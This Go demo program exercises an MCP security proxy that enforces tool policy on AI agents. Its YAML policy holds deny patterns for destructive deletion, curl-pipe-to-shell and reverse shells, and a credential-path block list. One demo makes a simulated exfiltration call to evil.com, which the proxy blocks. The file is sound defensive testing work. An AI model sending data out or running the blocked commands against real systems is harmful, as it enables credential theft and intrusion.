package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
)

func writeDemoPolicy(path, serverName string) {
	policy := fmt.Sprintf(`version: "1.0"
description: "Demo policy"
default_action: deny
settings:
  chain_window_size: 5
  approval_timeout_seconds: 10
  log_level: info
servers:
  - name: "%s"
    allowed: true
    tools:
      - name: "file_read"
        allowed: true
        risk: medium
        rules:
          - type: deny_path
            patterns:
              - "/etc/passwd"
              - "**/.env"
              - "**/.env.*"
              - "**/credentials*"
              - "**/*.pem"
              - "**/*.key"
              - "**/.ssh/**"
          - type: allow_path
            patterns:
              - "/home/**"
              - "/tmp/**"
              - "/var/log/**"
      - name: "http_post"
        allowed: true
        risk: high
        approval_required: true
      - name: "shell_exec"
        allowed: true
        risk: critical
        approval_required: true
        rules:
          - type: deny_command_pattern
            patterns:
              - "rm\\s+-rf\\s+/"
              - "curl.*\\|.*(bash|sh)"
              - "bash\\s+-i\\s+>&"
          - type: deny_command_keyword
            keywords:
              - "reverse shell"
              - "backdoor"
      - name: "slack_send_message"
        allowed: true
        risk: high
        approval_required: true
tool_chains:
  - name: "prevent_data_exfiltration"
    sources:
      - server: "*"
        tool_pattern: "file_read"
    sinks:
      - server: "*"
        tool_pattern: "(http_post|slack_send_message)"
    action: deny
    within_calls: 3
redaction:
  output_redaction: true
  sensitive_files:
    - "**/.env"
    - "**/.env.*"
    - "**/credentials"
    - "**/secrets"
    - "**/*.pem"
    - "**/*.key"
    - "**/.ssh/**"
`, serverName)
	_ = os.WriteFile(path, []byte(policy), 0644)
}

func main() {
	fmt.Println("╔══════════════════════════════════════════════════════╗")
	fmt.Println("║           MCP Visor - Security Demo                  ║")
	fmt.Println("║  Runtime Policy Enforcement & Audit Control Plane    ║")
	fmt.Println("╚══════════════════════════════════════════════════════╝")
	fmt.Println()

	fmt.Println("[build] building mock MCP server...")
	mockBin := filepath.Join(os.TempDir(), fmt.Sprintf("mcp-mock-%d", os.Getpid()))
	buildCmd := exec.Command("go", "build", "-o", mockBin, "./examples/demo-mcp-server")
	buildCmd.Stderr = os.Stderr
	if err := buildCmd.Run(); err != nil {
		fmt.Printf("  failed to build mock server: %v\n", err)
		os.Exit(1)
	}
	defer func() { _ = os.Remove(mockBin) }()

	fmt.Println("[build] building mcp-visor...")
	visorBin := filepath.Join(os.TempDir(), fmt.Sprintf("mcp-visor-%d", os.Getpid()))
	buildCmd = exec.Command("go", "build", "-o", visorBin, "./cmd/mcp-visor")
	buildCmd.Stderr = os.Stderr
	if err := buildCmd.Run(); err != nil {
		fmt.Printf("  failed to build visor: %v\n", err)
		os.Exit(1)
	}
	defer func() { _ = os.Remove(visorBin) }()

	policyPath := filepath.Join(os.TempDir(), fmt.Sprintf("visor-policy-%d.yaml", os.Getpid()))
	writeDemoPolicy(policyPath, mockBin)
	defer func() { _ = os.Remove(policyPath) }()

	auditLog := filepath.Join(os.TempDir(), fmt.Sprintf("visor-audit-%d.jsonl", os.Getpid()))
	defer func() { _ = os.Remove(auditLog) }()

	approvalDir := filepath.Join(os.TempDir(), fmt.Sprintf("visor-approvals-%d", os.Getpid()))
	_ = os.MkdirAll(approvalDir, 0700)
	defer func() { _ = os.RemoveAll(approvalDir) }()

	fmt.Println("[start] launching mcp-visor proxy...")
	visorCmd := exec.Command(visorBin, "serve",
		"-server", mockBin,
		"-policy", policyPath,
		"-audit-log", auditLog,
		"-approval-dir", approvalDir,
	)
	stdin, _ := visorCmd.StdinPipe()
	stdout, _ := visorCmd.StdoutPipe()
	stderr, _ := visorCmd.StderrPipe()

	if err := visorCmd.Start(); err != nil {
		fmt.Printf("  failed to start visor: %v\n", err)
		os.Exit(1)
	}
	defer func() { _ = visorCmd.Process.Kill() }()

	w := bufio.NewWriter(stdin)
	r := bufio.NewReader(stdout)

	go func() {
		scanner := bufio.NewScanner(stderr)
		for scanner.Scan() {
			line := scanner.Text()
			if strings.Contains(line, "proxy ready") || strings.Contains(line, "policy denied") ||
				strings.Contains(line, "chain denied") || strings.Contains(line, "approval") ||
				strings.Contains(line, "arguments redacted") || strings.Contains(line, "output redacted") ||
				strings.Contains(line, "sensitive file") {
				fmt.Printf("  [visor] %s\n", line)
			}
		}
	}()

	ctx := &mcpContext{w: w, r: r}
	ctx.send(map[string]any{
		"jsonrpc": "2.0", "id": 1, "method": "initialize",
		"params": map[string]any{
			"protocolVersion": "2024-11-05",
			"capabilities":    map[string]any{},
			"clientInfo":      map[string]any{"name": "demo-agent", "version": "1.0"},
		},
	})
	ctx.recv()
	ctx.send(map[string]any{"jsonrpc": "2.0", "method": "notifications/initialized"})
	time.Sleep(100 * time.Millisecond)

	demoApprovalGranted(ctx, approvalDir)
	demoSecretRedaction(ctx)
	demoNormalRead(ctx)
	demoSensitiveFile(ctx)
	demoChainDenied(ctx)
	demoAuditLog(auditLog)

	fmt.Println()
	fmt.Println("╔══════════════════════════════════════════════════════╗")
	fmt.Println("║              Demo Complete                           ║")
	fmt.Println("╚══════════════════════════════════════════════════════╝")
}

func demoNormalRead(ctx *mcpContext) {
	fmt.Println()
	fmt.Println("── Normal file read (ALLOWED) ──")
	fmt.Println("   Agent reads /home/user/readme.md")
	ctx.send(map[string]any{
		"jsonrpc": "2.0", "id": 100, "method": "tools/call",
		"params": map[string]any{"name": "file_read", "arguments": map[string]any{"path": "/home/user/readme.md"}},
	})
	resp := ctx.recv()
	if resp["error"] != nil {
		fmt.Printf("   ✗ BLOCKED: %v\n", resp["error"])
	} else {
		result := extractText(resp)
		fmt.Printf("   ✓ %s\n", result)
	}
}

func demoChainDenied(ctx *mcpContext) {
	fmt.Println()
	fmt.Println("── Chain detection (DENIED) ──")
	fmt.Println("   Agent reads sensitive data, then tries to exfiltrate")

	ctx.send(map[string]any{
		"jsonrpc": "2.0", "id": 200, "method": "tools/call",
		"params": map[string]any{"name": "file_read", "arguments": map[string]any{"path": "/tmp/data.csv"}},
	})
	resp := ctx.recv()
	if resp["error"] == nil {
		fmt.Printf("   ✓ file_read allowed: %s\n", extractText(resp))
	}

	ctx.send(map[string]any{
		"jsonrpc": "2.0", "id": 201, "method": "tools/call",
		"params": map[string]any{"name": "http_post", "arguments": map[string]any{"url": "https://evil.com/exfil", "body": "stolen_data"}},
	})
	resp = ctx.recv()
	if resp["error"] != nil {
		err := resp["error"].(map[string]any)
		fmt.Printf("   ✗ CHAIN BLOCKED: %v\n", err["message"])
	} else {
		fmt.Println("   (unexpectedly allowed)")
	}
}

func demoSensitiveFile(ctx *mcpContext) {
	fmt.Println()
	fmt.Println("── Sensitive file (DENIED) ──")
	fmt.Println("   Agent tries to read project/.env")

	ctx.send(map[string]any{
		"jsonrpc": "2.0", "id": 300, "method": "tools/call",
		"params": map[string]any{"name": "file_read", "arguments": map[string]any{"path": "/project/.env"}},
	})
	resp := ctx.recv()
	if resp["error"] != nil {
		err := resp["error"].(map[string]any)
		fmt.Printf("   ✗ SENSITIVE FILE BLOCKED: %v\n", err["message"])
	} else {
		fmt.Println("   (unexpectedly allowed)")
	}
}

func demoSecretRedaction(ctx *mcpContext) {
	fmt.Println()
	fmt.Println("── Secret redaction ──")
	fmt.Println("   Agent sends API key and connection string in arguments")

	ctx.send(map[string]any{
		"jsonrpc": "2.0", "id": 400, "method": "tools/call",
		"params": map[string]any{
			"name": "http_post",
			"arguments": map[string]any{
				"url": "https://api.internal/check",
				"headers": map[string]any{
					"Authorization": "Bearer sk-proj-deadbeef1234567890abcdef123456",
				},
				"body": "db_connection: mongodb://admin:SuperSecret@db.prod:27017/admin",
			},
		},
	})
	resp := ctx.recv()
	if resp["error"] != nil {
		err := resp["error"].(map[string]any)
		fmt.Printf("   ⚠ approval required: %v\n", err["message"])
		fmt.Println("   (secrets would be redacted before reaching the server)")
	} else {
		fmt.Printf("   ✓ %s\n", extractText(resp))
	}
}

func demoApprovalGranted(ctx *mcpContext, approvalDir string) {
	fmt.Println()
	fmt.Println("── Approval workflow ──")
	fmt.Println("   Agent tries to send a Slack message (requires approval)")

	go func() {
		time.Sleep(1 * time.Second)
		entries, _ := os.ReadDir(approvalDir)
		for _, entry := range entries {
			if strings.HasPrefix(entry.Name(), "req-") && strings.HasSuffix(entry.Name(), ".json") {
				id := strings.TrimPrefix(entry.Name(), "req-")
				id = strings.TrimSuffix(id, ".json")
				fmt.Printf("   [approval] request file: %s\n", entry.Name())
				fmt.Println("   [approval] operator approves...")
				okPath := filepath.Join(approvalDir, fmt.Sprintf("req-%s.ok", id))
				_ = os.WriteFile(okPath, []byte{}, 0600)
				fmt.Println("   ✓ approved")
				return
			}
		}
	}()

	ctx.send(map[string]any{
		"jsonrpc": "2.0", "id": 500, "method": "tools/call",
		"params": map[string]any{
			"name": "slack_send_message",
			"arguments": map[string]any{
				"channel": "#engineering",
				"text":    "Deployment v2.4.1 complete - all tests green",
			},
		},
	})
	resp := ctx.recv()
	fmt.Printf("   result: ")
	if resp["error"] != nil {
		err := resp["error"].(map[string]any)
		fmt.Printf("✗ DENIED: %v\n", err["message"])
	} else {
		fmt.Printf("✓ %s\n", extractText(resp))
	}
}

func demoAuditLog(auditLog string) {
	fmt.Println()
	fmt.Println("── Audit Log ──")
	data, err := os.ReadFile(auditLog)
	if err != nil {
		fmt.Printf("   could not read audit log: %v\n", err)
		return
	}
	lines := strings.Split(strings.TrimSpace(string(data)), "\n")
	if len(lines) > 10 {
		lines = lines[len(lines)-10:]
	}
	for _, line := range lines {
		var event map[string]any
		if err := json.Unmarshal([]byte(line), &event); err != nil {
			continue
		}
		eventType := event["event_type"]
		tool := event["tool"]
		decision := event["policy_decision"]
		reason := event["reason"]
		if reason != nil && reason != "" {
			fmt.Printf("   [%v] %v | decision=%v | %v\n", eventType, tool, decision, reason)
		} else {
			fmt.Printf("   [%v] %v | decision=%v\n", eventType, tool, decision)
		}
	}
}

type mcpContext struct {
	w *bufio.Writer
	r *bufio.Reader
}

func (c *mcpContext) send(msg map[string]any) {
	data, _ := json.Marshal(msg)
	_, _ = c.w.Write(append(data, '\n'))
	_ = c.w.Flush()
}

func (c *mcpContext) recv() map[string]any {
	line, err := c.r.ReadBytes('\n')
	if err != nil {
		return map[string]any{"error": map[string]any{"message": err.Error()}}
	}
	var msg map[string]any
	_ = json.Unmarshal(line, &msg)
	return msg
}

func extractText(resp map[string]any) string {
	result, ok := resp["result"].(map[string]any)
	if !ok {
		return ""
	}
	content, ok := result["content"].([]any)
	if !ok || len(content) == 0 {
		return ""
	}
	first, ok := content[0].(map[string]any)
	if !ok {
		return ""
	}
	text, _ := first["text"].(string)
	if len(text) > 80 {
		text = text[:80] + "..."
	}
	return text
}
